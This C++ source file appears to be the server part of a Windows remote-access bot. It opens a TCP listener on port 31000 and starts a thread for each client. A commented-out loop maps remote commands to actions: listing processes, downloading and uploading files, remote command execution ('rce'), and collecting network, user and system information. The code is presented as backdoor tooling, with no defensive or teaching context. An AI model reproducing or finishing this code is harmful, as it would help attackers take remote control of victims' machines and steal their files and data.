#include "bot.h"

#define WIN32_LEAN_AND_MEAN
#define BUF_SIZE 2000

using namespace std;

int main()
{

	printf("Starting up multi-threaded TCP server\n");

    // our masterSocket(socket that listens for connections)
    SOCKET sock;

    // for our thread
    DWORD thread;

    WSADATA wsaData;
    sockaddr_in server;

    // start winsock
    printf("Initializing Winsock...\n");
    int ret = WSAStartup(0x101,&wsaData); // use highest version of winsock avalible
    if(ret != 0)
    {
        printf("Failed to initialize Winsock. Error Code : %d\n", WSAGetLastError());
        return 1;
    }
    printf("Initiazed.\n");

    // fill in winsock struct ...
    server.sin_family=AF_INET;
    server.sin_addr.s_addr=INADDR_ANY;
    server.sin_port=htons(31000); // listen on telnet port 31000

    // create our socket to be connected to
    sock=socket(AF_INET,SOCK_STREAM,0);
    if(sock == INVALID_SOCKET)
    {
        return 0;
    }

    // bind our socket to a port
    printf("Binding socket to port\n");
    if( bind(sock,(sockaddr*)&server,sizeof(server)) !=0 )
    {
        printf("Bind socket to port Failed...");
        return 0;
    }

    // listen for a connection
    if(listen(sock,5) != 0)
    {
        printf("No longer listening for connection...\n");
        return 0;
    }

    // socket that we send and receive data on
    SOCKET client;

    sockaddr_in from;
    int fromlen = sizeof(from);

    // loop forever
    printf("Waiting to accept connections...");
    while(true)
    {
        // accept connections
        client = accept(sock,(struct sockaddr*)&from,&fromlen);
        printf("Client connected\r\n");
        cout << "client before thread:" << (int) client << endl;
        // create our recv_cmds thread and pass client socket as a parameter
        CreateThread(NULL, 0,doStuff,(LPVOID)client, 0, &thread);
        printf("New thread made!");
    }

    WSACleanup();
	/*while(true){
		string command = "";
		//wait for command, since socket is in recv
		command = bender.recive_command();


		if(command == "process_list"){
			string data = "";
			data = bender.process_list();
			bender.post_data(data);
		}

		if(command == "dl_file"){
			int data;
			data = bender.dl_file();
			if(data == 0){
				bender.post_data("0");
			}else{
				bender.post_data("1");
			}
		}

		if(command == "ul_file"){
			int data;
			data = bender.ul_file();
			if(data == 0){
				bender.post_data("0");
			}else{
				bender.post_data("1");
			}
		}

		if(command == "rce"){
			string data = "";
			data = bender.rce();
			bender.post_data(data);
		}

		if(command == "net_info"){
			string data = "";
			data = bender.net_info();
			bender.post_data(data);
		}

		if(command == "whoami"){
			string data = "";
			data = bender.whoami();
			bender.post_data(data);
		}

		if(command == "sys_info"){
			string data = "";
			data = bender.sys_info();
			bender.post_data(data);
		}

	}*/
    system("pause");
  	return 0;

}
